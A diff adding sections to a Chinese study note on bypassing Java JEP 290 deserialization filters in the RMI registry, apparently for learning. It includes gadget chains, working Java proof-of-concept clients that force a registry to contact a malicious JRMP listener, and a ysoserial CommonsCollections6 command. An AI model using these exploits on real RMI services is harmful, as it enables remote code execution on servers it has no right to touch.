@@ -215,17 +215,457 @@ public interface RemoteInterface extends Remote {
 
 ### RegistryImpl 对象与 JEP290
 `RegistryImpl`作为一个特殊的对象, 导出在`RMI`服务端, 客户端调用的`bind`、`lookup`、`list`等操作, 实际上是操作`RegistryImpl`的`bindings`这个`Hashtable`. `RegistryImpl`特殊在导出过程中生成的`Target`对象是一个"定制"的`Target`对象, 具体体现在:
- - 这个`Target`中`id`的`objNum`是固定的, 为`ObjID.REGISTRY_ID`, 也就是`0`.
- - 这个`Target`中`disp`是`filter`为`RegisryImpl::RegistryFilter`, `skel`为`RegsitryImpl_skel`的`UnicastServerRef`对象.
- - 这个`Target`中`stub`为`RegistryImpl_stub`.
+ - `Target`中`id`的`objNum`是固定的, 为`ObjID.REGISTRY_ID`, 也就是`0`.
+ - `Target`中`disp`是`filter`为`RegisryImpl::RegistryFilter`, `skel`为`RegsitryImpl_skel`的`UnicastServerRef`对象.
+ - `Target`中`stub`为`RegistryImpl_stub`.
 
 ![bindings](./images/19.png)
 
-#### 导出过程
+### DGCImpl 对象与 JEP290
+`DGCImpl`对象和`RegistryImpl`对象类似都是一个特殊的对象, 其`Target`对象的特殊体现在:
+ - `Target`中`id`的`objNum`是固定的, 为`ObjID.DGC_ID`, 也就是`2`.
+ - `Target`中`disp`是`filter`为`DGCImpl::DGCFilter`, `skel`为`DGCImpl_skel`的 `UnicastServerRef`对象.
+ - `Target`中`stub`为`DGC_stub`.
+
+### 通过 JVM 参数或者配置文件进行配置
+#### RegistryImpl
+`RegistryImpl`中含有一个静态字段`registryFilter`, 所以在`new RegistryImpl`对象的时候会调用`initRegistryFilter`方法进行赋值.
+
+```java
+private static final ObjectInputFilter registryFilter = (ObjectInputFilter)AccessController.doPrivileged(RegistryImpl::initRegistryFilter);
+```
+
+跟进`RegistryImpl#initRegistryFilter`方法, 首先会读取`JVM`的`sun.rmi.registry.registryFilter`的属性, 当其为`null`时会读取`%JAVA_HOME%\conf\security\java.security`配置文件中的`sun.rmi.registry.registryFilter`字段来得到`JEP 290`形式的`pattern`, 再调用`ObjectInputFilter.Config.createFilter2`创建`filter`并返回.
+
+![RegistryImpl#initRegistryFilter`](./images/20.png)
+
+这里用`jdk8u311`的`java.security`文件来示例.
+
+![pathOfJavaSecurity](./images/21.png)
+
+![java.security](images/22.png)
+
+需要注意的是, 存在一个函数`RegistryImpl#registryFilter`, 其会先判断静态字段`registryFilter`是否为`null`来决定是使用用户自定义的过滤规则, 还是使用默认的白名单规则. 如果不是`null`的话, 会先调用用户自定义的过滤规则进行检查, 接着判断检查结果, 如果不为`UNDECIDED`就直接返回检查的结果, 否则再使用默认的白名单检查.
+
+![RegistryImpl#regstiryFilter](./images/23.png)
+
+#### DGCImpl
+`DGCImpl`中含有一个静态字段`dgcFilter`, 所以在`new DGCImpl`对象的时候会调用`initDgcFilter`方法进行赋值.
+
+![DGCImpl#dgcFilter](./images/24.png)
+
+跟进`DGCImpl#initDgcFilter`方法, 首先会读取`JVM`的`sun.rmi.transport.dgcFilter`的属性, 当其为`null`时会读取`%JAVA_HOME%\conf\security\java.security`配置文件中的`sun.rmi.transport.dgcFilter`字段来得到`JEP 290`形式的`pattern`, 再调用`ObjectInputFilter.Config.createFilter`创建`filter`并返回.
+
+![DGCImpl#initDgcFilter](./images/25.png)
+
+这里用`jdk8u311`的`java.security`文件来示例.
+
+![java.security](images/26.png)
+
+在`DGCImpl`中存在一个和`RegistryImpl#registryFilter`函数类似的函数`DGCImpl#checkInput`, 其会先判断`DGCImpl#dgcFilter`字段是否为`null`, 从而来决定是使用用户自定义的过滤规则, 还是使用默认的白名单规则. 如果不是`null`的话, 会先调用用户自定义的过滤规则进行检查, 接着判断检查结果, 如果不为`UNDECIDED`就直接返回检查的结果, 否则再使用默认的白名单检查.
+
+![DGCImpl#checkInput](./images/27.png)
+
+## RMI-JEP290 绕过
+在`RMI`中`JEP 290`主要是在远程引用层之上进行过滤的, 所以其过滤作用对`Server`和`Client`的互相攻击无效(完成和`Registry`通信之后, 客户端和服务端的相互通信就到了远程引用层和传输层).
+
+![server-client](./images/28.png)
+
+在`RegistryImpl#registryFilter`中的白名单内容有:
+ - String
+ - Number
+ - Remote
+ - Proxy
+ - UnicastRef
+ - RMIClientSocketFactory
+ - RMIServerSocketFactory
+ - ActivationID
+ - UID
+
+在`DGCImpl#checkInput`中的白名单内容有:
+ - ObjID
+ - UID
+ - VMID
+ - Lease
+
+只要反序列化的类不是白名单中的类, 便会返回`REJECTED`操作符, 表示序列化流中有不合法的内容, 直接抛出异常.
+
+### 8u121~8u230
+#### UnicastRef 类
+在`RegistryImpl#registryFilter`中的白名单中可以看到该类, 它也是`RMIServer`或者`RMIClient`和`Registry`通信的基础. 当我们在执行`lookup`、`bind`等操作时往往先会获取一个`Registry`, 示例代码如下:
+
+```java
+package org.h3rmesk1t.jep290;
+
+import org.h3rmesk1t.rmi.RemoteInterface;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/1/30 7:53 下午
+ */
+public class RMIClient {
+    public static void main(String[] args) throws Exception {
+
+        // 获取远程对象实例
+        // RemoteInterface stub = (RemoteInterface) Naming.lookup("//localhost:4444/demoCaseBegin");
+
+        // 获取远程对象实例
+        Registry registry = LocateRegistry.getRegistry("localhost", 7777);
+        org.h3rmesk1t.rmi.RemoteInterface stub = (RemoteInterface) registry.lookup("demo");
+
+        // 方法调用
+        System.out.println("方法调用结果: " + stub.demoCaseBegin(stub.openCalculatorObject()));
+    }
+}
+```
+
+跟进`LocateRegistry#getRegistry`方法, 先用`TCPEndpoint`封装`Registry`的`host`、`port`等信息, 然后用`UnicastRef`封装了`liveRef`, 最终获取到一个在其中封装了一个`UnicastRef`对象的`RegistryImpl_Stub`对象.
+
+![LocateRegistry#getRegistry](./images/29.png)
+
+接着将断点下在`lookup`处, 看看`Client`中的`stub`对象是如何连接`Registry`的. 跟进后不难看出, 其连接过程是先通过`UnicastRef`的`newCall`方法发起连接, 然后把要绑定的对象发送到`Registry`. 因此, 如果我们可以控制`UnicastRef#LiveRef`所封装的`host`、`port`等信息, 便可以发起一个任意的`JRMP`连接请求, 这个`trick`点和`ysoserial`中的`payloads.JRMPClient`是相同的原理.
+
+![lookup](./images/30.png)
+
+#### RemoteObject 类
+`RemoteObject`实现了`Remote`和`Serializable`接口, 而`Remote`又是`RegistryImpl#registryFilter`中白名单的内容, 因此它及其子类是可以通过白名单检测的. 在后续分析中, 利用的正是`RemoteObject#readObject`方法. 其最后的`ref.readExternal(in)`中的`ref`正好是一个`UnicastRef`对象.
+
+![RemoteObject#readObject](./images/31.png)
+
+跟进`UnicastRef#readExternal`方法, 其会进而调用`LiveRef#read`方法.
+
+![UnicastRef#readExternal](./images/32.png)
+
+跟进`LiveRef#read`方法, 在该方法中先会调用`TCPEndpoint#readHostPortFormat`方法读出序列化流中的`host`和`port`相关信息, 然后将其重新封装成一个`LiveRef`对象, 并将其存储到当前的`ConnectionInputStream`上.
+
+![LiveRef#read](./images/33.png)
+
+跟进`ConnectionInputStream#saveRef`方法, 其建立了一个`TCPEndpoint`到`ArrayList<LiveRef>`的映射关系.
+
+![ConnectionInputStream#saveRef](./images/34.png)
+
+回到前面的`RemoteObject#readObject`方法, 这里的`readObject`是在`RegistryImpl_Skle#dispatch`中的`readObject`方法触发来的.
+
+![RegistryImpl_Skle#dispatch](./images/35.png)
+
+在服务端触发了反序列化之后, 继续往下走, 调用`StreamRemoteCall#releaseInputStream`方法, 这里的`this.in`便是之前谈到的存储在`LiveRef`对象的那个`ConnectionInputStream`对象, 在这里会调用`ConnectionInputStream#registerRefs`方法.
+
+![StreamRemoteCall#releaseInputStream`](./images/36.png)
+
+跟进`ConnectionInputStream#registerRefs`, 这里就会发现会根据之前在`ConnectionInputStream#saveRef`方法建立的映射关系来提取相应的值, 然后传入到`DGCClient#registerRefs`方法中.
+
+![ConnectionInputStream#registerRefs](./images/37.png)
+
+跟进`DGCClient#registerRefs`方法, 在这里可以看到, `DGCClient`向恶意的`JRMP`服务端发起`lookup`连接.
+
+![DGCClient#registerRefs](./images/38.png)
+
+#### ByPass
+在上文对`UnicastRef`和`RemoteObject`两个类的分析中可以发现:
+ - `RemoteObject`类及其子类对象可以被`bind`或者`lookup`到`Registry`, 且在白名单之中.
+ - `RemoteObject`类及其没有实现`readObject`方法的子类经过反序列化可以通过内部的`UnicastRef`对象发起`JRMP`请求连接恶意的`Server`.
+
+至此, `ByPass JEP-290`的思路就非常明确了:
+ 1. `ysoserial`开启一个恶意的`JRMPListener`.
+ 2. 控制`RemoteObject`中的`UnicastRef`对象(封装了恶意`Server`的`host`、`port`等信息).
+ 3. `Client`或者`Server`向`Registry`发送这个`RemoteObject`对象, `Registry`触发`readObject`方法之后会向恶意的`JRMP Server`发起连接请求.
+ 4. 连接成功后成功触发`JRMPListener`.
+
+`Registry`触发反序列化利用链如下:
+
+```text
+客户端发送数据 ->...
+UnicastServerRef#dispatch –>
+UnicastServerRef#oldDispatch –>
+RegistryImpl_Skle#dispatch –> RemoteObject#readObject
+StreamRemoteCall#releaseInputStream –>
+ConnectionInputStream#registerRefs –>
+DGCClient#registerRefs –>
+DGCClient$EndpointEntry#registerRefs –>
+DGCClient$EndpointEntry#makeDirtyCall –>
+DGCImpl_Stub#dirty –>
+UnicastRef#invoke –> (RemoteCall var1)
+StreamRemoteCall#executeCall –>
+ObjectInputSteam#readObject –> "demo"
+```
+
+`ByPass JEP-290`的关键在于: 通过反序列化将`Registry`变为`JRMP`客户端, 向`JRMPListener`发起`JRMP`请求.
+
+![ByPass JEP-290](./images/39.png)
+
+这里还需要注意的一点就是需要找到一个类实现类`RemoteObject`方法.
+
+![findClass](./images/40.png)
+
+#### Demo
+测试代码如下:
+ - RMIRegistry
+
+```java
+package org.h3rmesk1t.jep290.bypass8u230;
+
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/2/4 2:13 上午
+ */
+public class RMIRegistry {
+
+    public static void main(String[] args) throws RemoteException {
+
+        LocateRegistry.createRegistry(2222);
+        System.out.println("RMI Registry Start...");
+
+        while (true);
+    }
+}
+```
+ - RMIClient
+
+```java
+package org.h3rmesk1t.jep290.bypass8u230;
+
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.ObjID;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.util.Random;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/2/4 2:15 上午
+ */
+public class RMIClient {
+
+    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
+
+        Registry registry = LocateRegistry.getRegistry(2222);
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 9999);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        registry.bind("demo", obj);
+    }
+}
+```
+
+ - ysoserial
+
+```bash
+java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'open /System/Applications/Calculator.app'
+```
+
+![bypass jdk8u121-jdk8u130](./images/41.png)
+
+#### 修复
+`JDK8u231`版本及以上的`DGCImpl_Stub#dirty`方法中多了一个`setObjectInputFilter`的过程, 导致`JEP 290`重新可以`check`到. 
+
+![](./images/58.png)
+
+### 8u231~8u240
+在`ByPass 8u121~8u230`的时候, `UnicastRef`类用了一层包装, 通过`DGCClient`向`JRMPListener`发起`JRMP`请求, 而在`jdk8u231`版本及以上的`DGCImpl_Stub#dirty`方法中多了一个`setObjectInputFilter`的过程, 此时又会被`JEP290 check`到. `ByPass 8u231~8u240`的`Gadget`如下:
+
+```text
+客户端发送数据 –> 服务端反序列化(RegistryImpl_Skle#dispatch)
+UnicastRemoteObject#readObject –>
+UnicastRemoteObject#reexport –>
+UnicastRemoteObject#exportObject –> overload
+UnicastRemoteObject#exportObject –>
+UnicastServerRef#exportObject –> …
+TCPTransport#listen –>
+TcpEndpoint#newServerSocket –>
+RMIServerSocketFactory#createServerSocket –> Dynamic Proxy(RemoteObjectInvocationHandler)
+RemoteObjectInvocationHandler#invoke –>
+RemoteObjectInvocationHandler#invokeMethod –>
+UnicastRef#invoke –> (Remote var1, Method var2, Object[] var3, long var4)
+StreamRemoteCall#executeCall –>
+ObjectInputSteam#readObject –> "demo"
+```
+
+#### Gadget 分析
+首先跟进`UnicastRemoteObject#readObject`方法, 在最后继续调用`UnicastRemoteObject#reexport`方法, 这里通过判断有无设置`csf`和`ssf`来分别调用两种重载方法.
+
+![UnicastRemoteObject#readObject](./images/42.png)
+
+![UnicastRemoteObject#reexport](./images/43.png)
+
+由于在`ByPass`的`exploit`中会设置`ssf`, 这里跟进`else`中的`exportObject`方法. 跟进`UnicastRemoteObject#exportObject`方法, 这里把`port`、`csf`、`ssf`作为构造方法参数传入`UnicastServerRef2`.
+
+![UnicastRemoteObject#exportObject](./images/44.png)
+
+跟进`UnicastServerRef2`方法, 发现其内部封装了一层`LiveRef`.
+
+![UnicastServerRef2](./images/45.png)
+
+继续回到上一步, 跟进重载的`UnicastRemoteObject#exportObject`方法, 继续调用`UnicastServerRef#exportObject`方法, 这里在之前分析`RMI`的文章中有分析过, 大致流程为创建`RegistryImpl_Stub`、`RegistryImpl_Skel`对象, 最终调用到`TCPTransport#listen`方法创建监听栈.
+
+TCPTransport#listen 方法创建监听栈.
+
+![UnicastRemoteObject#exportObject](./images/46.png)
+
+![UnicastServerRef#exportObject](./images/47.png)
+
+跟进`TCPTransport#listen`方法, 创建一个`TCPEndpoint`对象后, 进一步调用`TCPEndpoint#newServerSocket`方法, 这里有一层动态代理, 通过`RemoteObjectInvocationHandler`代理`RMIServerSocketFactory`接口, 然后把生成的代理对象设置为该`ssf`.
+
+![TCPTransport#listen](./images/48.png)
+
+![TCPEndpoint#newServerSocket](./images/49.png)
+
+跟进`RemoteObjectInvocationHandler#invoke`方法, 在`if-else`判断中所有`if`条件均不成立, 调用到`RemoteObjectInvocationHandler#invokeRemoteMethod`方法, 由于此处的`ref`可控, 将其设置为`UnicastRef`后, 调用`UnicastRef#invoke`方法.
+
+![RemoteObjectInvocationHandler#invoke](./images/50.png)
+
+![RemoteObjectInvocationHandler#invokeRemoteMethod](./images/51.png)
 
 
+跟进`UnicastRef#invoke`方法中, `Registry`向`JRMPListener`发起`JRMP`请求, 进行数据交互, 会成功调用到`StreamRemoteCall#executeCall`方法.
 
+![UnicastRef#invoke`](./images/52.png)
 
+在`StreamRemoteCall#executeCall`方法中, 反序列化`JRMPListener`的`Payload`, 由于这里获取到`InputStream`之后并没有设置`JEP 290`的`filter`, 因此成功`ByPass`.
+
+![StreamRemoteCall#executeCall](./images/53.png)
+
+#### Demo
+需要注意的是, 本地在`bind`或者`rebind`一个对象的时候, 在序列化对象的时候会来到`MarshalOutputStream#replaceObject`方法. 如果这个对象没有继承`RemoteStub`的话, 原先的`UnicastRemoteObject`会被转化成`RemoteObjectInvocationHandler`, 服务端也就无法触发`UnicastRemoteObject#readObject`方法. 这里可以采用重写`RegistryImpl#bind`方法, 在序列化之前通过反射`ObjectInputStream`, 修改`enableReplace`为`false`
+
+![](./images/54.png)
+
+![](./images/55.png)
+
+测试代码如下:
+
+ - RMIRegistry
+
+```java
+package org.h3rmesk1t.jep290.bypass8u230;
+
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/2/4 2:13 上午
+ */
+public class RMIRegistry {
+
+    public static void main(String[] args) throws RemoteException {
+
+        LocateRegistry.createRegistry(6666);
+        System.out.println("RMI Registry Start...");
+
+        while (true);
+    }
+}
+```
+
+ - RMIServer
+
+```java
+package org.h3rmesk1t.jep290.bypass8u240;
+
+import sun.rmi.registry.RegistryImpl_Stub;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+
+import java.io.ObjectOutput;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Proxy;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.*;
+import java.util.Random;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/2/4 3:31 上午
+ */
+public class RMIServer {
+
+    public static void main(String[] args) throws Exception {
+
+        UnicastRemoteObject payload = getPayload();
+        Registry registry = LocateRegistry.getRegistry(6666);
+        bindReflection("demo", payload, registry);
+    }
+
+    static UnicastRemoteObject getPayload() throws Exception {
+
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint("localhost", 9999);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+
+        System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
+        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
+        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
+                handler.getClass().getClassLoader(),
+                new Class[]{RMIServerSocketFactory.class, Remote.class},
+                handler
+        );
+
+        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
+        constructor.setAccessible(true);
+        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();
+
+        Field field_ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
+        field_ssf.setAccessible(true);
+        field_ssf.set(unicastRemoteObject, factory);
+
+        return unicastRemoteObject;
+    }
+
+    static void bindReflection(String name, Object obj, Registry registry) throws Exception {
+
+        Field ref_filed = RemoteObject.class.getDeclaredField("ref");
+        ref_filed.setAccessible(true);
+        UnicastRef ref = (UnicastRef) ref_filed.get(registry);
+
+        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField("operations");
+        operations_filed.setAccessible(true);
+        Operation[] operations = (Operation[]) operations_filed.get(registry);
+
+        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
+        ObjectOutput outputStream = remoteCall.getOutputStream();
+
+        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
+        enableReplace_filed.setAccessible(true);
+        enableReplace_filed.setBoolean(outputStream, false);
+
+        outputStream.writeObject(name);
+        outputStream.writeObject(obj);
+
+        ref.invoke(remoteCall);
+        ref.done(remoteCall);
+    }
+}
+```
+
+ - ysoserial
+
+```bash
+java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'open /System/Applications/Calculator.app'
+```
+
+![](./images/56.png)
+
+#### 修复
+`JDK8u241`在`RemoteObjectInvocationHandler#invokeRemoteMethod`中声明要调用的方法的类, 必须实现`Remote`接口, 而`RMIServerSocketFactory`类没有实现该接口, 于是会直接抛出异常无法调用.
+
+![](./images/57.png)
 
 ## 参考
  - [漫谈 JEP 290](https://paper.seebug.org/1689/)
@@ -234,5 +674,9 @@ public interface RemoteInterface extends Remote {
  - [JEP 290: Filter Incoming Serialization Data](https://openjdk.java.net/jeps/290)
 
 ## 工具
-学习时找`ysoserial`的现成`jar`包找了半天, 这里挂个链接(但愿不会寄了)方便后续学习和复习时用.
+学习时找`ysoserial`的现成`jar`包找了半天, 这里挂个`ysoserial`下载链接(但愿不会寄了)方便后续学习和复习时用.
  - [ysoserial](https://jitpack.io/com/github/frohoff/ysoserial/)
+
+在上文分析的攻击`RMI`服务端的绕过方法, 网上有一些现成的工具, 比如:
+ - [rmitast](https://github.com/STMCyber/RmiTaste)
+ - [rmisout](https://github.com/BishopFox/rmiscout)
